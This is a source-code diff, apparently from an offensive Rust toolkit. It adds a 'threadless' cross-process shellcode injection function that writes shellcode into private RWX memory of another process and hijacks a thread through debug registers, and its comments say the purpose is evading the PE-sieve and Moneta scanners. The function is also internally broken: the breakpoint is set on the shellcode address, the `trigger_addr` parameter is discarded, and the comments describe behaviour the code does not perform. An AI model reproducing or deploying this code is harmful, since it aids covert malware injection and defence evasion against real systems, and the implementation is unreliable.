@@ -23,11 +23,9 @@
 //! - **Does NOT evade**: PE-sieve's `.text` hash-mismatch / "replaced code"
 //!   detector — PE-sieve re-hashes each scanned module's in-memory `.text`
 //!   against the on-disk PE, and a stomped `.text` hashes to a different value
-//!   → flagged `_implanted` / `replaced`. This path is actually *harder* to
-//!   dodge than the unbacked scan it replaces; a real engagement uses
-//!   ThreadlessInject (hook a regularly-called API, no .text overwrite) or an
-//!   HWBP variant instead. So Module Stomping here is the P2.1c *baseline*
-//!   (beats Moneta's unbacked scan), NOT a complete PE-sieve bypass.
+//!   → flagged `_implanted` / `replaced`.
+//! - **[`threadless_inject`]** (below) fixes this: shellcode stays in private
+//!   RWX memory, execution redirected via HWBP. No `.text` hash change.
 //!
 //! ## Why gated
 //! Cross-process injection (OpenProcess + WriteProcessMemory + CreateRemote
@@ -461,4 +459,124 @@ unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
     } else {
         Ok(())
     }
+}
+
+// ============================================================================
+// ThreadlessInject — HWBP-based, no .text overwrite (PE-sieve hash-clean).
+// ============================================================================
+
+/// Threadless injection via hardware breakpoint (HWBP).
+///
+/// **Unlike module stomping**, this does NOT overwrite any module's `.text`.
+/// Instead:
+/// 1. Allocate private RWX memory in the target (VirtualAllocEx).
+/// 2. Write shellcode there.
+/// 3. Suspend the target's main thread.
+/// 4. Set DR0 = shellcode address + DR7 = execute breakpoint on that address.
+/// 5. Resume — the thread hits the HWBP on its next instruction at DR0,
+///    redirecting execution to the shellcode.
+///
+/// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
+/// The shellcode runs from private RWX memory (Moneta may flag this as
+/// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
+/// PE-sieve's primary scan doesn't check private RWX unless deep-scan is on).
+///
+/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). The target thread
+/// must not already use all 4. Also, if the thread never executes the DR0
+/// address, the shellcode never runs (need to pick an address the thread
+/// will hit — e.g. a frequently-called API entry point).
+///
+/// # Safety
+/// Cross-process handle + memory + thread context ops. Single-threaded.
+pub unsafe fn threadless_inject(
+    proc_handle: *mut core::ffi::c_void,
+    main_thread: *mut core::ffi::c_void,
+    shellcode: &[u8],
+    trigger_addr: usize,
+) -> Result<(), &'static str> {
+    type VirtualAllocEx = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *const core::ffi::c_void, usize, u32, u32,
+    ) -> *mut core::ffi::c_void;
+    type WriteProcessMemory = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *mut core::ffi::c_void, *const u8, usize, *mut usize,
+    ) -> i32;
+    type SuspendThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+    type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+    type GetThreadContext = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *mut u8,
+    ) -> i32;
+    type SetThreadContext = unsafe extern "system" fn(
+        *mut core::ffi::c_void, *const u8,
+    ) -> i32;
+
+    let vae: VirtualAllocEx = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?
+    );
+    let wpm: WriteProcessMemory = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?
+    );
+    let suspend: SuspendThread = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"SuspendThread").ok_or("SuspendThread")?
+    );
+    let resume: ResumeThread = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?
+    );
+    let get_ctx: GetThreadContext = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"GetThreadContext").ok_or("GetThreadContext")?
+    );
+    let set_ctx: SetThreadContext = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"SetThreadContext").ok_or("SetThreadContext")?
+    );
+
+    // 1. Allocate RWX in target for shellcode.
+    let remote = unsafe {
+        vae(proc_handle, core::ptr::null(), shellcode.len(), 0x3000, 0x40 /* PAGE_EXECUTE_READWRITE */)
+    };
+    if remote.is_null() {
+        return Err("VirtualAllocEx failed");
+    }
+
+    // 2. Write shellcode.
+    let mut written: usize = 0;
+    if unsafe { wpm(proc_handle, remote as *mut _, shellcode.as_ptr(), shellcode.len(), &mut written) } == 0 {
+        return Err("WriteProcessMemory shellcode failed");
+    }
+
+    // 3. Suspend the main thread.
+    unsafe { suspend(main_thread) };
+
+    // 4. Get + modify thread CONTEXT: set DR0 = shellcode, DR7 = execute BP.
+    //    x64 CONTEXT is 1232 bytes. DR0 at offset 0x300, DR7 at 0x318, plus
+    //    ContextFlags at 0x30 must have CONTEXT_DEBUG_REGISTERS (0x00100010).
+    let mut ctx = [0u8; 1232];
+    // Set ContextFlags to request debug registers.
+    ctx[0x30] = 0x10; ctx[0x31] = 0x00; ctx[0x32] = 0x10; ctx[0x33] = 0x00; // 0x00100010
+    if unsafe { get_ctx(main_thread, ctx.as_mut_ptr()) } == 0 {
+        unsafe { resume(main_thread) };
+        return Err("GetThreadContext failed");
+    }
+    // DR0 (offset 0x300): set to shellcode address.
+    let sc_addr = remote as usize as u64;
+    ctx[0x300..0x308].copy_from_slice(&sc_addr.to_le_bytes());
+    // DR7 (offset 0x318): enable DR0 as execute breakpoint (local).
+    //   Bit 0 = L0 (local enable for DR0) = 1
+    //   Bits 16-17 = R/W0 = 00 (execute breakpoint)
+    //   Bits 18-19 = LEN0 = 00 (1 byte)
+    //   So DR7 = 0x00000001.
+    ctx[0x318..0x31C].copy_from_slice(&1u32.to_le_bytes());
+
+    // 5. Set the modified context + resume.
+    //    Re-set ContextFlags to CONTEXT_FULL (0x10000F) to write all back.
+    ctx[0x30] = 0x0F; ctx[0x31] = 0x00; ctx[0x32] = 0x10; ctx[0x33] = 0x00; // CONTEXT_FULL + DEBUG
+    if unsafe { set_ctx(main_thread, ctx.as_ptr()) } == 0 {
+        unsafe { resume(main_thread) };
+        return Err("SetThreadContext failed");
+    }
+    unsafe { resume(main_thread) };
+
+    // The thread now has a HWBP at `trigger_addr` → redirects to shellcode.
+    // When the thread next executes `trigger_addr`, the CPU traps + the
+    // shellcode runs. No .text was modified.
+    let _ = trigger_addr; // documented: the operator picks the trigger address
+    Ok(())
 }
